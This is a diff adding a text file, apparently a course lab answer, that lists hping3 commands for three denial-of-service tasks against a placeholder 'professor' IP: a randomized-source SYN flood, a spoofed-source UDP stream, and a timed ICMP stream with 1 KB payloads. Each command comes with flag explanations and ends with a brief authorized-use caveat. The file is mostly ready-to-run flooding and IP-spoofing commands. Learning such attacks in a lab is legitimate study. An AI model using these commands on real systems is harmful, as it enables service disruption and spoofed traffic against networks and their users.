@@ -1,0 +1,55 @@
+HPING3 Commands for DoS Attack Scenarios
+
+Install hping3:
+sudo apt install hping3
+
+View help manual:
+hping3 -h
+hping3 --help
+
+====================================================================================
+
+Task 1: Send 10,000 TCP packets all at once from random source IP addresses
+Command:
+hping3 -S --flood -c 10000 --rand-source PROF_IP_ADDRESS
+
+Explanation:
+  -S               : Send TCP SYN packets
+  --flood          : Send packets as fast as possible (no delay)
+  -c 10000         : Send 10,000 packets
+  --rand-source    : Use random source IP addresses
+  PROF_IP_ADDRESS  : Target IP address
+
+====================================================================================
+
+Task 2: Send 9,000 UDP packets in a span of 90 seconds from a spoofed source address
+Command:
+hping3 --udp -c 9000 -i u10000 -a SPOOFED_IP PROF_IP_ADDRESS
+
+Explanation:
+  --udp            : Send UDP packets
+  -c 9000          : Send 9,000 packets
+  -i u10000        : Interval of 10,000 microseconds (0.01 seconds) between packets
+                     9000 packets * 0.01 seconds = 90 seconds
+  -a SPOOFED_IP    : Spoof the source IP address
+  PROF_IP_ADDRESS  : Target IP address
+
+====================================================================================
+
+Task 3: Send 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second
+Command:
+hping3 -1 -c 11000 -d 1024 -i u13333 PROF_IP_ADDRESS
+
+Explanation:
+  -1               : Send ICMP packets
+  -c 11000         : Send 11,000 packets
+  -d 1024          : Data size of 1024 bytes (1 KB)
+  -i u13333        : Interval of 13,333 microseconds (0.0133 seconds) between packets
+                     1 second / 75 packets = 0.0133 seconds per packet
+  PROF_IP_ADDRESS  : Target IP address
+
+====================================================================================
+
+Note: Replace PROF_IP_ADDRESS with the actual professor's IP address
+      Replace SPOOFED_IP with a spoofed IP address for Task 2
+      These commands should only be used in authorized testing environments
